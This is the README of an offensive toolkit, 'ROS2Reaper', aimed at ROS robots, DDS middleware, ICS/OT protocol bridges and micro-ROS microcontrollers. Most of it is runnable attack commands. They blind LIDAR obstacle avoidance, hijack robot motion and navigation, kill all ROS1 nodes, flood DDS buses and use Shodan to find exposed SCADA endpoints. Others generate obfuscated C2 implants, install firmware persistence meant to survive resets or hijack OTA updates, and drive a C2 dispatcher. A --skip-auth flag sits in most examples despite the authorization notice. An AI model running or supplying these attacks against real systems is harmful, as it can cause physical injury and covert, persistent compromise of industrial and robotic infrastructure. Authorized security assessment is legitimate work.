# ROS2Reaper

```
  ██████╗  ██████╗ ███████╗██████╗ ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗
  ██╔══██╗██╔═══██╗██╔════╝╚════██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗
  ██████╔╝██║   ██║███████╗ █████╔╝██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝
  ██╔══██╗██║   ██║╚════██║██╔═══╝ ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗
  ██║  ██║╚██████╔╝███████║███████╗██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║
  ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
```

**DDS/RTPS + ROS 1 + ICS/OT Bridge + micro-ROS/XRCE Offensive Security Assessment Framework**

> Author: Gh057x | v0.5.0-alpha
> Targets: ROS 2 (Humble / Jazzy) · DDS (Fast DDS, Cyclone DDS, RTI Connext) · ROS 1 (Noetic / Melodic) · ICS/OT (Modbus, DNP3, OPC UA, MQTT, EtherCAT, AWS IoT) · micro-ROS (XRCE / DDS-XRCE, Arduino, STM32, ESP32, nRF52)

---

## ⚠️ Legal Notice

```
╔══════════════════════════════════════════════════════════════════════╗
║  AUTHORIZED USE ONLY — MISUSE CAN CAUSE PHYSICAL HARM              ║
║  Only use on systems you own or have written authorization to test. ║
║  Robotic systems can cause injury. Ensure safety controls are in   ║
║  place before testing. Follow responsible disclosure practices.     ║
╚══════════════════════════════════════════════════════════════════════╝
```

---

## Overview

ROS2Reaper is a modular offensive security toolkit for assessing ROS 2 and ROS 1 robotic deployments. It targets the underlying DDS/RTPS transport layer — the communication backbone of ROS 2 — as well as the legacy ROS 1 rosmaster XML-RPC interface.

The framework is split into five phases:

| Phase | Description |
|-------|-------------|
| **Phase 1 — Reconnaissance** | Passive/active discovery, fingerprinting, enumeration, and security auditing |
| **Phase 2 — Exploitation** | Topic injection, node impersonation, RTPS amplification, and parameter manipulation |
| **Phase 3 — ICS/OT Bridge Analysis** | Attack surface analysis for DDS bridges to Modbus, DNP3, OPC UA, MQTT, EtherCAT, and AWS IoT Greengrass |
| **Phase 4 — Post-Exploitation / C2** | Covert DDS command-and-control channel, beacon implant, and data exfiltration |
| **Phase 5A — micro-ROS / XRCE** | XRCE Agent discovery, traffic profiling, client hijacking, implant generation, firmware persistence, and C2 dispatching for embedded micro-ROS targets |

---

## Project Structure

```
ros2reaper_framework/
├── ros2reaper.py          # Main entry point / CLI
├── core/
│   ├── rtps_parser.py     # RTPS packet parser + DDS port calculator
│   ├── rtps_scanner.py    # SPDP probing, network scanning, passive listening
│   ├── ros1_master.py     # ROS1 rosmaster XML-RPC interface
│   └── ros1_transport.py  # TCPROS transport implementation
└── modules/
    ├── fingerprint.py         # DDS vendor/version/config fingerprinting
    ├── topic_enum.py          # ROS 2 topic/service/node enumeration
    ├── sros2_audit.py         # SROS2 security configuration auditing
    ├── topic_injection.py     # ROS 2 topic injection attacks
    ├── node_impersonation.py  # Node impersonation & TF poisoning
    ├── amplification.py       # RTPS amplification & robustness testing
    ├── rosbridge.py           # rosbridge WebSocket enumeration/injection/audit
    ├── ros1_enum.py           # ROS1 node/topic/param enumeration
    ├── ros1_injection.py      # ROS1 TCPROS topic injection
    ├── ros1_exploitation.py   # ROS1 node killing & parameter manipulation
    ├── ros1_audit.py          # ROS1 security configuration auditing
    ├── phase3/
    │   ├── ics_dds_enum.py        # ICS/OT context-aware DDS enumeration
    │   ├── modbus_dnp3_bridge.py  # Modbus/DNP3 ↔ DDS bridge analysis
    │   ├── mqtt_ethercat_bridge.py # MQTT/EtherCAT ↔ DDS bridge analysis
    │   ├── opcua_dds_bridge.py    # OPC UA ↔ DDS bridge analysis
    │   ├── aws_iot_bridge.py      # AWS IoT Greengrass ↔ DDS bridge analysis
    │   └── shodan_dds.py          # Internet-wide DDS exposure via Shodan
    └── phase5a/
        ├── microros_agent.py      # XRCE Agent discovery & participant enumeration
        ├── xrce_traffic_analysis.py # XRCE traffic capture & behavioral profiling
        ├── microros_client_hijack.py # XRCE client spoofing & topic injection
        ├── microros_implant.py    # C2 implant source generator (C++/Arduino/Python)
        ├── microros_persistence.py # Firmware-level persistence mechanisms
        └── c2_dispatcher.py       # Operator C2 dispatcher for implants/agents
```

---

## Installation

```bash
git clone https://github.com/r3tr0xCTF/ros2reaper_framework.git
cd ros2reaper_framework
pip install -r requirements.txt
```

> ROS 2 exploitation modules (`inject`, `impersonate`) require `rclpy` and a sourced ROS 2 environment. All Phase 1 and Phase 3 modules work with no ROS dependency.
>
> Phase 3 optional dependencies (all gracefully degraded if missing):
> ```bash
> pip install shodan paho-mqtt pymodbus requests asyncua
> ```

---

## Usage

```
python3 ros2reaper.py <command> [options]
```

### Global Options

| Flag | Description |
|------|-------------|
| `-t`, `--target` | Target IP address |
| `-n`, `--network` | Target network in CIDR notation |
| `-d`, `--domain-id` | DDS Domain ID (default: 0) |
| `--timeout` | Probe timeout in seconds (default: 3.0) |
| `--duration` | Listen/attack duration in seconds (default: 30.0) |
| `-o`, `--output` | Save results to JSON file |
| `-v`, `--verbose` | Verbose output |
| `--skip-auth` | Skip authorization prompt (for scripting) |
| `--no-banner` | Suppress ASCII banner |

**Phase 3 options:**

| Flag | Description |
|------|-------------|
| `--threads` | Concurrent scan threads (default: 50) |
| `--deep` | Enable deep probing / protocol coexistence detection |
| `--context` | ICS sector bias: `scada`, `atc`, `automotive`, `smart_grid`, `military`, `medical`, `iiot` |
| `--passive` | Passive multicast listener mode — no probes sent (`ics-enum`) |
| `--passive-duration` | Passive listen duration in seconds (default: 30.0) |
| `--modbus-enumerate` | Enumerate Modbus unit IDs and test write access |
| `--mqtt-enumerate` | Full MQTT wildcard topic enumeration (requires `paho-mqtt`) |
| `--enum-duration` | MQTT topic listen duration in seconds (default: 10.0) |
| `--enumerate-nodes` | Browse OPC UA address space for DDS bridge indicators |
| `--shadow-enumerate` | Probe AWS IoT Shadow/Jobs topics on discovered brokers |
| `--api-key` | Shodan API key (or set env `SHODAN_API_KEY`) |
| `--limit` | Max Shodan results per query (default: 100) |
| `--rate` | Seconds between Shodan API calls (default: 1.0) |
| `--export` | Export discovered IP list from Shodan results to file |

---

## Phase 1 — Reconnaissance

### `discover` — DDS Participant Discovery

Sends SPDP (Simple Participant Discovery Protocol) probes to identify DDS participants on the network.

```bash
# Multicast probe on local network
python3 ros2reaper.py discover

# Single target
python3 ros2reaper.py discover --target 192.168.1.100

# Full network sweep
python3 ros2reaper.py discover --network 192.168.1.0/24 -o discovered.json
```

---

### `fingerprint` — DDS Vendor / Version Identification

Fingerprints discovered participants to identify DDS implementation, RMW layer, ROS 2 distro, OS hints, deployment type, and security posture.

```bash
python3 ros2reaper.py fingerprint --target 192.168.1.100
python3 ros2reaper.py fingerprint --network 192.168.1.0/24 -o fingerprints.json
```

Output includes:
- DDS vendor (Fast DDS, Cyclone DDS, RTI Connext, etc.)
- RMW implementation and ROS 2 distribution
- Node name and deployment type
- OS hint
- Security status — DDS Security / SROS2 enabled or disabled
- Risk factors with severity (CRITICAL / HIGH / MEDIUM / LOW)

---

### `portscan` — DDS Port Discovery

Scans for open DDS-specific UDP ports derived from domain IDs. Identifies discovery and user data channels per participant.

```bash
python3 ros2reaper.py portscan --target 192.168.1.100 --domains 0-10
python3 ros2reaper.py portscan --network 192.168.1.0/24 --domains 0,1,5
```

---

### `portcalc` — DDS Port Calculator

Calculates expected DDS port numbers for given domain IDs without sending any traffic.

```bash
python3 ros2reaper.py portcalc --domains 0-15
python3 ros2reaper.py portcalc --domains 0,1,42 -v
```

```
  Domain | Disc MC | Disc UC | User MC | User UC
-------------------------------------------------------
       0 |    7400 |    7410 |    7401 |    7411
       1 |    7650 |    7660 |    7651 |    7661
```

---

### `listen` — Passive RTPS Traffic Capture

Listens passively on DDS multicast groups. Zero packets sent — full stealth mode.

```bash
python3 ros2reaper.py listen --domain-id 0 --duration 60
python3 ros2reaper.py listen --domain-id 0 --duration 120 -o captured.json
```

---

### `enumerate` — ROS 2 Graph Enumeration

Enumerates the full ROS 2 compute graph: topics, services, nodes, publishers, and subscribers.

```bash
python3 ros2reaper.py enumerate --target 192.168.1.100
python3 ros2reaper.py enumerate --domain-id 5 -o graph.json
```

---

### `audit` — SROS2 Security Configuration Audit

Audits the security posture of discovered participants: checks for disabled encryption, missing access control, insecure QoS policies, and unauthenticated endpoints.

```bash
python3 ros2reaper.py audit --target 192.168.1.100
python3 ros2reaper.py audit --network 192.168.1.0/24 -o audit.json
```

---

### `full` — Complete Assessment

Runs all Phase 1 modules sequentially (discovery → fingerprinting → port scan) and produces a single consolidated JSON report.

```bash
python3 ros2reaper.py full --network 192.168.1.0/24 -o full_report.json
python3 ros2reaper.py full --target 192.168.1.100 --domain-id 0 -v
```

---

## Phase 2 — Exploitation (ROS 2)

> Requires a sourced ROS 2 environment and `rclpy`. Run from an attacker container or a ROS 2-capable host.

### `inject` — Topic Message Injection

Injects malicious messages onto ROS 2 topics across multiple attack modes.

| Mode | Description |
|------|-------------|
| `cmd_vel` | Velocity command injection — presets: `spin`, `fullspeed`, `reverse`, `erratic`, `estop`, `circle` |
| `lidar` | LIDAR scan spoofing — modes: `allclear`, `wall`, `phantom` |
| `nav` | Navigation goal hijacking — send robot to arbitrary coordinates |
| `odom` | Odometry spoofing — corrupt pose estimation pipeline |
| `swarm` | Multi-robot convergence attack — drive an entire fleet to one point |

```bash
# Spin the robot
python3 ros2reaper.py inject --namespace /robot1 --preset spin --duration 10

# Full speed injection
python3 ros2reaper.py inject --namespace /robot1 --preset fullspeed --duration 5

# Blind LIDAR — inject clear-path data to suppress obstacle avoidance
python3 ros2reaper.py inject --attack-mode lidar --namespace /robot1 --lidar-mode allclear --duration 30

# Navigation goal hijack
python3 ros2reaper.py inject --attack-mode nav --namespace /robot1 --x 10 --y 5 --duration 20

# Odometry corruption
python3 ros2reaper.py inject --attack-mode odom --namespace /robot1 --duration 15

# Swarm convergence
python3 ros2reaper.py inject --attack-mode swarm --namespaces /robot1 /robot2 /robot3 --x 5 --y 5 --duration 30
```

---

### `impersonate` — Node Impersonation

Impersonates existing ROS 2 nodes to inject data, corrupt the TF tree, flood topics, or saturate the DDS bus with fake participants.

| Mode | Description |
|------|-------------|
| `shadow` | Shadow publisher — mirror a target node's topic output with attacker-controlled data |
| `tf` | TF tree poisoning — inject corrupt coordinate frame transforms |
| `dos` | Topic flooding — saturate a node's subscriptions |
| `sybil` | Sybil attack — spawn N fake DDS participants |

```bash
# Shadow publisher
python3 ros2reaper.py impersonate --attack-mode shadow --target-node robot_controller --namespace /robot1 --duration 30

# TF poisoning
python3 ros2reaper.py impersonate --attack-mode tf --target-node fake_robot_1 --namespace /robot1 --duration 20

# Topic DoS
python3 ros2reaper.py impersonate --attack-mode dos --namespace /robot1 --duration 10

# Sybil (20 fake participants)
python3 ros2reaper.py impersonate --attack-mode sybil --namespace /robot1 --count 20 --duration 30
```

---

### `amplify` — RTPS Amplification & Robustness Testing

Tests DDS implementations for amplification vulnerabilities and protocol robustness at the raw RTPS level. No ROS 2 installation required.

| Mode | Description |
|------|-------------|
| `full_suite` | Run all robustness tests sequentially |
| `reflect` | SPDP reflection / amplification measurement |
| `exhaust` | Participant exhaustion via GUID flooding |
| `fuzz` | Malformed RTPS packet fuzzing |
| `heartbeat` | Heartbeat amplification test |

```bash
# Full suite
python3 ros2reaper.py amplify --target 192.168.1.100 --attack-mode full_suite

# Participant exhaustion
python3 ros2reaper.py amplify --target 192.168.1.100 --attack-mode exhaust --count 500

# Protocol fuzzing
python3 ros2reaper.py amplify --target 192.168.1.100 --attack-mode fuzz --domain-id 0
```

---

## ROS 1 Modules

Targets legacy ROS 1 deployments via the rosmaster XML-RPC API and TCPROS protocol.

### `ros1-discover` — Enumeration

Enumerates all nodes, topics, services, and parameters from a rosmaster.

```bash
python3 ros2reaper.py ros1-discover --target 192.168.1.10 --skip-auth
python3 ros2reaper.py ros1-discover --target 192.168.1.10 --ros1-port 11311 -v -o ros1_enum.json
```

---

### `ros1-audit` — Security Audit

Audits a ROS1 deployment for misconfigurations: unauthenticated master, security-critical topic exposure, EOL distros, and exposed parameter server.

```bash
python3 ros2reaper.py ros1-audit --target 192.168.1.10 --skip-auth -o ros1_audit.json
```

---

### `ros1-inject` — Topic Injection

Injects messages into ROS1 topics via TCPROS without being a registered node.

```bash
# cmd_vel spinout
python3 ros2reaper.py ros1-inject --target 192.168.1.10 --topic /cmd_vel --preset spinout --duration 10 --skip-auth

# LIDAR blind injection
python3 ros2reaper.py ros1-inject --target 192.168.1.10 --attack-mode lidar --topic /scan --duration 10 --skip-auth
```

---

### `ros1-exploit` — Node Kill / Parameter Manipulation

Kills ROS1 nodes and reads, writes, or deletes parameter server values.

```bash
# Kill a specific node
python3 ros2reaper.py ros1-exploit --target 192.168.1.10 --node /turtlesim --skip-auth

# Kill all nodes
python3 ros2reaper.py ros1-exploit --target 192.168.1.10 --kill-all --skip-auth

# Write a parameter
python3 ros2reaper.py ros1-exploit --target 192.168.1.10 --param-key /max_speed --param-value 0.1 --skip-auth

# Dump all parameters
python3 ros2reaper.py ros1-exploit --target 192.168.1.10 --skip-auth
```

---

## Phase 3 — ICS/OT Bridge Analysis

> No ROS installation required. All modules operate at the raw socket/TCP level.

Phase 3 targets environments where DDS/ROS 2 is bridged to industrial control system protocols. Each module discovers protocol co-existence, maps the bridge attack surface, and generates scored attack scenarios with CVSS ratings.

---

### `ics-enum` — ICS/OT Context-Aware DDS Enumeration

Classifies DDS deployments operating in non-robotics ICS/OT contexts: SCADA, air traffic control, automotive, smart grid, military, medical, and IIoT. Performs passive multicast listening or active SPDP probing with Bayesian context inference.

```bash
# Active scan — single target, SCADA context
python3 ros2reaper.py ics-enum --target 10.0.0.1 --deep --context scada --skip-auth

# Network sweep
python3 ros2reaper.py ics-enum --network 10.0.0.0/24 --deep -o ics.json --skip-auth

# Passive mode — no packets sent (stealth)
python3 ros2reaper.py ics-enum --passive --passive-duration 60 --skip-auth
```

---

### `modbus-scan` — Modbus/DNP3 ↔ DDS Bridge Analysis

Detects hosts running DDS alongside Modbus TCP (legacy SCADA) or DNP3 (power grid protocols). Maps bridge attack surface with scored scenarios including coil/register write injection, historian poisoning, and alarm suppression (max CVSS 9.8).

```bash
python3 ros2reaper.py modbus-scan --target 10.0.0.1 --deep --modbus-enumerate --skip-auth
python3 ros2reaper.py modbus-scan --network 10.0.0.0/24 -o modbus.json --skip-auth
```

---

### `mqtt-scan` — MQTT/EtherCAT ↔ DDS Bridge Analysis

Detects DDS alongside MQTT (IIoT edge-cloud) or EtherCAT (real-time fieldbus). Enumerates MQTT topics via wildcard subscription, parses Sparkplug B payloads, detects known bridge products (RTI, Zenoh, EMQX, Azure IoT Edge), and maps PDO data poisoning and topic injection scenarios (max CVSS 9.8).

```bash
python3 ros2reaper.py mqtt-scan --target 10.0.0.1 --deep --mqtt-enumerate --skip-auth
python3 ros2reaper.py mqtt-scan --network 10.0.0.0/24 -o mqtt.json --skip-auth
```

---

### `opcua-scan` — OPC UA ↔ DDS Bridge Analysis

Detects hosts with both DDS and OPC UA (the dominant ICS data exchange standard). Probes OPC UA endpoints via raw TCP HEL/ACK, enumerates security modes, identifies vendor namespaces (Kepware, OSIsoft PI, Ignition, WinCC, FactoryTalk, etc.), and scores bridge attack scenarios including setpoint injection, alarm suppression, and historian poisoning (max CVSS 9.1).

```bash
python3 ros2reaper.py opcua-scan --target 10.0.0.1 --deep --enumerate-nodes --skip-auth
python3 ros2reaper.py opcua-scan --network 10.0.0.0/24 -o opcua.json --skip-auth
```

---

### `aws-scan` — AWS IoT Greengrass ↔ DDS Bridge Analysis

Detects AWS IoT Greengrass v2 co-located with DDS. Fingerprints Greengrass via DDS participant properties, IPC socket paths, and X.509 Thing ARN exfiltration in SPDP discovery traffic. Maps pivot paths from DDS to AWS cloud via IAM role abuse, Shadow manipulation, and OTA command injection (max CVSS 10.0).

```bash
python3 ros2reaper.py aws-scan --target 10.0.0.1 --deep --shadow-enumerate --skip-auth
python3 ros2reaper.py aws-scan --network 10.0.0.0/24 -o aws.json --skip-auth
```

---

### `shodan-dds` — Internet-Wide DDS Exposure via Shodan

Queries the Shodan API for internet-exposed DDS/RTPS endpoints. Classifies results by ICS sector, DDS vendor, security posture, and domain ID. Exports target IP lists for direct feeding into `ics-enum` and other Phase 3 modules.

```bash
# Full search campaign
python3 ros2reaper.py shodan-dds --api-key YOUR_KEY --context scada -o shodan.json --skip-auth

# Single host deep lookup
python3 ros2reaper.py shodan-dds --api-key YOUR_KEY --target 1.2.3.4 --skip-auth

# Export IP list for ics-enum pipeline
python3 ros2reaper.py shodan-dds --api-key YOUR_KEY --export targets.txt --skip-auth
```

> Set `SHODAN_API_KEY` in your environment to avoid passing `--api-key` on every command.

---

### Phase 3 Pipeline

Full ICS/OT assessment workflow:

```bash
# 1. Internet recon — find exposed DDS endpoints
python3 ros2reaper.py shodan-dds --api-key $SHODAN_API_KEY --export targets.txt --skip-auth

# 2. ICS context classification
python3 ros2reaper.py ics-enum --network 10.0.0.0/24 --deep -o ics.json --skip-auth

# 3. Protocol bridge enumeration (run in parallel)
python3 ros2reaper.py modbus-scan --network 10.0.0.0/24 --deep -o modbus.json --skip-auth
python3 ros2reaper.py mqtt-scan   --network 10.0.0.0/24 --deep -o mqtt.json   --skip-auth
python3 ros2reaper.py opcua-scan  --network 10.0.0.0/24 --deep -o opcua.json  --skip-auth
python3 ros2reaper.py aws-scan    --network 10.0.0.0/24 --deep -o aws.json    --skip-auth
```

---

## Phase 5A — micro-ROS / XRCE

> No ROS installation required. All Phase 5A modules operate at the raw UDP/socket level using the XRCE wire format.

Phase 5A targets embedded micro-ROS deployments — constrained MCU-based nodes (Arduino, STM32, ESP32, nRF52) that communicate via the DDS-XRCE (eXtremely Resource Constrained Environments) protocol through a micro-ROS Agent bridge.

**XRCE default ports:** UDP/8888 (standard), UDP/7400–7409 (alternative instances)

**Phase 5A options:**

| Flag | Description |
|------|-------------|
| `--agent-port` | XRCE Agent UDP port (default: 8888) |
| `--xrce-multiport` | Scan common XRCE ports (8888, 7400–7409) |
| `--xrce-enumerate` | Enumerate micro-ROS participants on discovered agents |
| `--xrce-attack` | Hijack attack type: `twist`, `nav`, `raw` |
| `--xrce-session` | Spoofed session ID in hex (default: 0x42) |
| `--pcap` | Export captured XRCE traffic to PCAP file |
| `--theta` | Nav goal orientation in radians (default: 0.0) |
| `--interval` | Delay between injections in seconds (default: 0.1) |
| `--payload-file` | Raw XRCE payload file (hex text) for raw injection |
| `--payload-hex` | Raw XRCE payload as hex string |
| `--platform` | Implant platform: `cpp`, `arduino`, `python` |
| `--implant-id` | Implant ID (auto-generated if omitted) |
| `--beacon-interval` | Implant beacon interval in ms (default: 5000) |
| `--beacon-topic` | Beacon topic base (default: `/implant/beacon`) |
| `--command-topic` | Command topic base (default: `/implant/command`) |
| `--obfuscate` | Strip comments from generated implant source |
| `--add-decoy` | Add decoy code to generated implant |
| `--manifest` | Export implant generation manifest to JSON |
| `--persist-method` | Persistence method: `library_patch`, `bootloader`, `firmware_inject`, `partition`, `ota_hijack` |
| `--implant-file` | Binary file with implant shellcode for persistence |
| `--implant-hex` | Implant shellcode as hex string |
| `--hook-address` | Bootloader hook address (hex, e.g. `0x08000100`) |
| `--partition-name` | Partition name for ESP32 partition hijack |
| `--ota-server` | OTA server for hijack config generation |
| `--dispatcher-port` | Phase 5A dispatcher callback port |
| `--beacon-timeout` | Implant beacon timeout in seconds (default: 60.0) |
| `--log-file` | Dispatcher log file path |
| `--export-session` | Export dispatcher session state to JSON |
| `--batch-file` | Run dispatcher commands from file (non-interactive) |

---

### `microros-agent` — XRCE Agent Discovery & Enumeration

Probes for XRCE Agents using minimal HEARTBEAT packets and fingerprints vendor/version from responses. Optionally enumerates connected micro-ROS participants (MCU clients).

```bash
# Single target
python3 ros2reaper.py microros-agent --target 10.0.0.5 --skip-auth

# Network sweep
python3 ros2reaper.py microros-agent --network 10.0.0.0/24 --skip-auth -o agents.json

# Scan all common XRCE ports on a single host
python3 ros2reaper.py microros-agent --target 10.0.0.5 --xrce-multiport --skip-auth

# Discover agents + enumerate connected MCU participants
python3 ros2reaper.py microros-agent --target 10.0.0.5 --xrce-enumerate --skip-auth

# Custom XRCE port
python3 ros2reaper.py microros-agent --target 10.0.0.5 --agent-port 7400 --skip-auth
```

---

### `xrce-traffic` — XRCE Traffic Analysis & Behavioral Profiling

Captures live XRCE traffic and builds a behavioral baseline: packet size distributions, inter-packet timing, heartbeat intervals, QoS patterns, and per-session/stream statistics. Used to time and size subsequent injections to blend with normal traffic.

```bash
# 30-second capture baseline
python3 ros2reaper.py xrce-traffic --target 10.0.0.5 --duration 30 --skip-auth

# Longer capture with JSON + PCAP export
python3 ros2reaper.py xrce-traffic --target 10.0.0.5 --agent-port 8888 \
    --duration 60 -o baseline.json --pcap capture.pcap --skip-auth -v
```

---

### `xrce-hijack` — XRCE Client Hijacking & Command Injection

Creates a spoofed XRCE client session against a discovered Agent and injects malicious DDS messages. Supports Twist (velocity), PoseStamped (navigation goal), and raw CDR payload injection.

| Mode | Description |
|------|-------------|
| `twist` | Inject `geometry_msgs/Twist` — robot velocity control |
| `nav` | Inject `geometry_msgs/PoseStamped` — navigation goal |
| `raw` | Inject arbitrary CDR-encoded payload from hex or file |

```bash
# Inject cmd_vel spin (default topic /cmd_vel)
python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack twist \
    --lx 0.5 --az 1.0 --count 20 --interval 0.1 --skip-auth

# Navigate robot to coordinates
python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack nav \
    --topic /move_base_simple/goal --x 15.0 --y 8.0 --skip-auth

# Raw payload injection (custom CDR message)
python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --xrce-attack raw \
    --topic /cmd_vel --payload-hex 0000803f000000000000000000000000000000000000803f \
    --count 5 --skip-auth

# Use specific session ID and custom port
python3 ros2reaper.py xrce-hijack --target 10.0.0.5 --agent-port 7400 \
    --xrce-session 0x81 --xrce-attack twist --lx 2.0 --skip-auth
```

---

### `uros-implant` — micro-ROS C2 Implant Generation

Generates complete micro-ROS C2 implant source code from templates. The implant beacons periodically to a C2 callback topic and accepts tasking commands over DDS. Supports three target platforms.

| Platform | Output | Use case |
|----------|--------|----------|
| `cpp` | `.cpp` (ROS 2 node) | Full ROS 2 host or cross-compiled MCU |
| `arduino` | `.ino` (Arduino sketch) | Arduino-compatible boards with Ethernet/WiFi |
| `python` | `.py` (rclpy node) | Rapid prototyping / testing |

```bash
# Generate Python implant (lab testing)
python3 ros2reaper.py uros-implant --platform python --skip-auth

# Generate Arduino implant with custom beacon interval
python3 ros2reaper.py uros-implant --platform arduino \
    --implant-id sensor_node_01 --beacon-interval 3000 --skip-auth

# Generate C++ implant with obfuscation + manifest
python3 ros2reaper.py uros-implant --platform cpp --obfuscate --add-decoy \
    --beacon-interval 10000 --manifest implants.json --skip-auth
```

---

### `uros-persist` — Firmware-Level Persistence

Establishes persistent implant presence at the firmware level. Generates patched firmware images, bootloader hooks, partition table modifications, or OTA hijack configurations.

| Method | Survives | Notes |
|--------|----------|-------|
| `library_patch` | App reinstalls | Injects beacon into micro-ROS client library |
| `bootloader` | OS wipe | Hooks bootloader to run implant before firmware |
| `firmware_inject` | Normal updates | Appends implant to firmware image |
| `partition` | Factory reset | Creates hidden partition in ESP32 partition table |
| `ota_hijack` | Updates (MITM) | Generates config for serving malicious OTA firmware |

```bash
# Library patch (micro-ROS .elf firmware)
python3 ros2reaper.py uros-persist --persist-method library_patch \
    --target firmware.elf --implant-id sensor_01 \
    --implant-hex deadbeef... --skip-auth -o persist.json

# ESP32 partition hijack
python3 ros2reaper.py uros-persist --persist-method partition \
    --target partitions.csv --implant-id sensor_01 \
    --implant-file implant.bin --partition-name implant_hidden --skip-auth

# OTA hijack config generation
python3 ros2reaper.py uros-persist --persist-method ota_hijack \
    --implant-id sensor_01 --ota-server ota.target.local --skip-auth

# Bootloader hook with specific hook address
python3 ros2reaper.py uros-persist --persist-method bootloader \
    --target bootloader.elf --implant-id sensor_01 \
    --implant-file implant.bin --hook-address 0x08000100 --skip-auth
```

---

### `uros-c2` — Phase 5A C2 Dispatcher

Interactive operator console that routes commands to deployed micro-ROS implants (via DDS topics) or live XRCE Agents (via Module 3 hijacking). Tracks the implant registry, manages task queues, and aggregates telemetry.

```bash
# Start interactive dispatcher
python3 ros2reaper.py uros-c2 --skip-auth

# With C2 callback and logging
python3 ros2reaper.py uros-c2 --target 10.0.0.1 --dispatcher-port 9999 \
    --beacon-timeout 120 --log-file dispatcher.log --skip-auth

# Batch mode — run commands from file
python3 ros2reaper.py uros-c2 --batch-file tasks.txt \
    --export-session session.json --skip-auth
```

**Dispatcher commands (interactive console):**

```
[dispatcher]> action uros_abc123 inject_twist lx=2.0 az=1.0
[dispatcher]> action uros_abc123 inject_nav x=10.0 y=5.0
[dispatcher]> action 10.0.0.5 inject_twist lx=5.0 port=8888
[dispatcher]> status implants
[dispatcher]> status implants uros_abc123
[dispatcher]> status tasks
[dispatcher]> help
```

---

### Phase 5A Pipeline

Full micro-ROS assessment and exploitation workflow:

```bash
# 1. Discover XRCE Agents on the subnet
python3 ros2reaper.py microros-agent --network 10.0.0.0/24 \
    --xrce-enumerate -o agents.json --skip-auth

# 2. Build behavioral baseline (30s passive capture)
python3 ros2reaper.py xrce-traffic --target 10.0.0.5 \
    --duration 30 -o baseline.json --pcap xrce.pcap --skip-auth

# 3. Hijack session and inject velocity command
python3 ros2reaper.py xrce-hijack --target 10.0.0.5 \
    --xrce-attack twist --lx 1.5 --az 0.5 --count 10 --skip-auth

# 4. Generate persistent implant
python3 ros2reaper.py uros-implant --platform python \
    --implant-id lab_node_01 --beacon-interval 5000 --skip-auth

# 5. Start C2 dispatcher and receive implant beacons
python3 ros2reaper.py uros-c2 --log-file lab_session.log --skip-auth
```

---

## Output

All commands support `-o <file.json>` for structured JSON output. The `full` command auto-generates a timestamped report when no output path is specified.

```bash
python3 ros2reaper.py full --network 10.0.0.0/24 -o report_$(date +%s).json
```

---

## License

MIT — Use responsibly. Only test systems you own or have explicit written authorization to assess.
